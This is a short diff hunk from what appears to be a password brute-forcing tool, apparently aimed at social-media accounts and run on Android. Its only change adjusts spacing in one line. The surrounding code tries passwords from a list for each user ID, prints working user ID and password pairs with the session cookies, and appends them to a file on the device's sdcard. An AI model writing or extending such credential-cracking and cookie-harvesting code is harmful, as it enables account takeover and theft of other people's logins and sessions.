@@ -177,7 +177,7 @@ def B(uid,passlist,tl):
                 cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                 print(f"\r\r{rad} [{green}MAHADI-💸{rad}] {green}{uid}{white} -{green} {pas}")
                 print(f"\r\r{green}=[🚬]={cookie}")
-                open('/sdcard/MAHADI-M2-OK.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
+                open('/sdcard/MAHADI-M2-OK.txt','a').write(uid+'| '+pas+' | '+cookie+'\n')
                 break
             else:
                 continue
